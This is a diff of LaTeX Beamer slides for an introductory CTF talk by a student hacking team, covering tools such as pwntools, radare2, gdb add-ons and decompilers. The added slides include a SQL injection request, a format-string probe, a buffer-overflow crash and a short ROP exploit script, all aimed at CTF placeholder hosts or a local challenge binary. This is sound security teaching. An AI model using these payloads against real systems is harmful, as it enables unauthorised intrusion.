@@ -5,8 +5,8 @@
     \begin{column}{0.48\textwidth}
       {\texttt{@f0rki}}
       \begin{itemize}
-        \item f0rki@hack.more.systems 
-        \item InfoSec Student
+        \item f0rki@hack.more.systems
+        \item CS/InfoSec Student
         \item CTF Player since 2010
       \end{itemize}
     \end{column}
@@ -15,7 +15,7 @@
       \texttt{@stefan2904}
       \begin{itemize}
         \item stefan@hack.more.systems
-        \item InfoSec Student
+        \item CS/InfoSec/CI Student
         \item CTF Player since 2014
       \end{itemize}
     \end{column}
@@ -39,15 +39,7 @@
     \begin{itemize}
     	\item Teams vs. Teams
     \end{itemize}
-    \item The goal is to capture flags
-      %\begin{itemize}
-        %\item Like \\
-        %  \verb+9447{ffmpeg_m0re_like_ffRCE_amirite}+ \\
-        %  or \\
-        %  \verb+FAUST_VnSn2AwDAd1XxAAAAACjEEhYAjVLomA1+
-        %\item More flags \verb+==+ more points
-      %\end{itemize}
-    \item Hack stuff and get flags
+    \item The goal is to capture Flags
   \end{itemize}
 \end{frame}
 
@@ -78,12 +70,16 @@
       \href{https://ructf.org/e/2015/network.html}{RUCTF org}) }
   \end{figure}
 \end{frame}
+
 \begin{frame}
   {CTF Type: Attack-Defense}
 
-  \begin{center}
+  \begin{figure}[h]
+    \centering
     \includegraphics[width=\textwidth]{./images/faustctf-scoreboard.png}
-  \end{center}
+    \caption{FAUST CTF 2015 scoreboard}
+    \label{fig:faustctfscoreboard}
+  \end{figure}
 
 \end{frame}
 
@@ -129,11 +125,11 @@
 
 \begin{frame}
 	{Where to start?}
-	
+
 	\begin{itemize}
 		\item Talk to us! :-)
 	\end{itemize}
-	
+
 	\begin{itemize}
 		\item Read writeups!
 		\begin{itemize}
@@ -141,7 +137,7 @@
 			\item Ours: \href{https://hack.more.systems/writeups}{hack.more.systems/writeups}
 		\end{itemize}
 	\end{itemize}
-	
+
 \end{frame}
 
 \section{CTF Toolbox}
@@ -193,6 +189,11 @@
   \end{itemize}
 \end{frame}
 
+
+\begin{frame}
+  \todo[inline]{add command line black-magic example}
+\end{frame}
+
 % python requests - automated browsing
 
 \begin{frame}[fragile]
@@ -200,13 +201,19 @@
 
   \begin{lstlisting}[language=python]
 import requests
-s = requests.session()
+
 URL = 'http://ctf.example.com'
+s = requests.session()
 r = s.post(URL + '/login',
            data={'user': 'fuzzy', 'pass': '1234'})
+
+# GET http://ctf.example.com/vuln?x='or%201=1--x
+resp = s.get(URL + '/vuln',
+             params={'x': '\'or 1=1 --x'})
 # session cookie automagically used here
-print s.get(URL + '/vuln', params={'x': 'or/**/1=1--x'}).text
-# GET 'http://ctf.example.com/vuln?x=or/**/1=1--x
+
+print resp.text
+# flag{some_flag_of_some_service}
   \end{lstlisting}
 \end{frame}
 
@@ -218,31 +225,238 @@ print s.get(URL + '/vuln', params={'x': 'or/**/1=1--x'}).text
 % TODO: send email or something
   \begin{lstlisting}[language=python]
 from pwn import *
+
 r = remote('ctf.example.com', 1337)
-r.recvline()  # ignore
-r.sendline('HELO %p%p%p%p')
+
+# line based
+r.recvline()
+r.sendline('HELO %s%s%s%s')
 r.recvuntil('250 Hello')
-data = r.recv(2 + 4 * 2)
+
+data = r.recv(4)
+
+# unpack LE uint32 from bin
+i = u32(data)
+log.info('received uint32 {}'.format(i))
+
+# pack BE uint32 to bin
+r.send(p32(1094795585, endian='big'))
 r.recvline()
   \end{lstlisting}
 \end{frame}
 
-% pwntools - build exploits and pwn binaries
 
-% radare2 - hex editor and disassembler
+\begin{frame}[fragile]
+
+
+  {\Huge A wild binary appears!}
+
+  \begin{lstlisting}
+$ file ./pwn
+pwn: ELF 32-bit LSB executable, Intel 80386,
+  version 1 (GNU/Linux), statically linked,
+  for GNU/Linux 2.6.24,
+  not stripped
+  \end{lstlisting}
+\end{frame}
+
+
+\begin{frame}[fragile]
+  \begin{center}
+    \verb+$ objdump -d pwn | less+
+
+    \includegraphics[width=0.95\textwidth]{./images/objdump.png}
+  \end{center}
+\end{frame}
+
+
+\begin{frame}
+  {radare2 to the rescue}
+  \begin{center}
+    \includegraphics[width=\textwidth]{./images/radare-disas.png}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \begin{center}
+    \includegraphics[width=\textwidth]{./images/radare-disas2.png}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \begin{center}
+    \includegraphics[width=\textwidth]{./images/radare-disas3.png}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  {radare2 -- reversing tool}
+
+  \begin{itemize}
+    \item Disassembler/Assembler
+    \item Debugger
+    \item Code emulator
+    \item Hex Editor
+    \item \ldots
+  \end{itemize}
+\end{frame}
 
 % gdb - pretty horrible
-%peda
-%https://github.com/cyrus-and/gdb-dashboard
-%voltron
 
-% retdec decompiler
+\begin{frame}
+	\begin{center}
+    \huge Debugging?
+	\end{center}
+\end{frame}
 
-% pen & paper - never underestimate
+\begin{frame}
+  \begin{center}
+    \includegraphics[width=0.8\textwidth]{./images/gdb-plain.png}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \begin{center}
+    \includegraphics[width=\textwidth]{./images/gdb-peda.png}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  {Debuggers}
+
+  \begin{itemize}
+    \item Use gdb with one of those:
+      \begin{itemize}
+        \item \href{https://github.com/longld/peda}{PEDA}
+        \item \href{https://github.com/hugsy/gef}{GEF}
+        \item \href{https://github.com/zachriggle/pwndbg}{pwndbg}
+        \item \href{https://github.com/snare/voltron}{voltron}
+        \item \href{https://github.com/cyrus-and/gdb-dashboard}{gdb-dashboard}
+      \end{itemize}
+    \item gdb alternatives: lldb, radare2
+    \item Newer debugging approaches
+      \begin{itemize}
+        \item \href{https://github.com/BinaryAnalysisPlatform/qira}{qira}
+        \item \href{http://rr-project.org/}{rr}
+      \end{itemize}
+  \end{itemize}
+\end{frame}
+
+
+\begin{frame}
+  {QIRA -- ``Timeless Debugging''}
+
+  \todo[inline]{add qira screenshot}
+
+\end{frame}
+
+
+% pwntools - build exploits and pwn binaries
+
+\begin{frame}[fragile]
+
+  {\Huge Pwning!}
+
+  \begin{lstlisting}
+$ mkfifo fifo
+$ ./pwn fifo & python -c 'print("A"*4128)' >> fifo
+[1] 9391
+The file has been saved successfully
+[1]  + 9391 segmentation fault (core dumped)  ./pwn fifo
+$ dmesg | tail -n 1
+pwn[9391]: segfault at 41414141 ip 0000000041414141
+  sp 00000000ffb6d340 error 14
+  \end{lstlisting}
+\end{frame}
+
+
+\begin{frame}[fragile]
+  {pwntools again!}
+
+  \begin{lstlisting}[language=python]
+from pwn import *  # NOQA
+import subprocess
+
+velf = ELF("./pwn")
+r = ROP(velf)
+r.call("exit", [42])
+payload = "A" * 4124 + str(r)
+
+# launch process
+vp = process(["./pwn", "./fifo"])
+# gdb.attach(vp)
+# break *0x8048f4e
+
+with open("./fifo", "w") as f:
+    f.write(payload)
+
+vp.interactive()
+  \end{lstlisting}
+\end{frame}
+
+\begin{frame}
+  \begin{center}
+    \includegraphics[height=0.7\textheight]{./images/pwntools-exp.png}
+  \end{center}
+\end{frame}
+
+
+\begin{frame}
+  \begin{center}
+    \includegraphics[width=\textwidth]{./images/pwntools-shellcraft.png}
+  \end{center}
+\end{frame}
+
+
+\begin{frame}[fragile,allowframebreaks]
+  {Binary Decompilers}
+
+  \begin{itemize}
+    \item No really good open source binary decompilers \verb+:(+
+      %\begin{itemize}
+        %\item \href{https://github.com/zneak/fcd}{fcd} gives
+      %\end{itemize}
+    \item Commercial/Closed-Source
+      \begin{itemize}
+        \item Hex-Rays/IDA Pro Decompiler (\$\$\$)
+        \item \href{http://hopperapp.com/}{Hopper} (\$)
+        \item \href{https://retdec.com/}{retdec} (free, webservice, no \verb+x86_64+)
+      \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+  {Bytecode Decompilers}
+
+  \begin{itemize}
+    \item Bytecode Decompilers much more sophisticated!
+    \item Java/Dalvik bytecode
+      \begin{itemize}
+        \item intellij built-in decompiler (fernflower)
+        \item
+          \href{https://bitbucket.org/mstrobel/procyon/}{procyon}
+        \item \href{https://github.com/skylot/jadx}{jadx}
+        %\item \href{https://github.com/Konloch/bytecode-viewer/}{bytecode
+        %viewer}
+          \todo[inline]{apktool?}
+      \end{itemize}
+    \item .net bytecode
+      \begin{itemize}
+        \item ILSpy, ???
+          \todo[inline]{add more?}
+      \end{itemize}
+  \end{itemize}
+
+\end{frame}
+
 
 % sagemath - crypto all the things
 
-% apktool - disassemble and patch android apps
+\begin{frame}
+  \todo[inline]{crypto/sage fu. factorization? ecc?}
+\end{frame}
+
+% pen & paper - never underestimate
 
 
 
@@ -257,7 +471,7 @@ r.recvline()
       \end{itemize}
     \item (only true for attack \&\&  \emph{during} CTFs!)
     \item If it works, \ldots it works!
-    \item Code-reuse between different CTFs
+    \item Code-reuse between different CTFs!
   \end{itemize}
 
 \end{frame}
@@ -269,5 +483,19 @@ r.recvline()
 \end{frame}
 
 \begin{frame}
-  {}
+
+  \begin{center}
+    {\huge \url{https://hack.more.systems}}
+  \end{center}
+
+  \vspace{3em}
+
+  Credits:
+
+  \begin{itemize}
+    \item The rest of the Team
+    \item \ldots
+      \todo[inline]{who?}
+  \end{itemize}
+
 \end{frame}
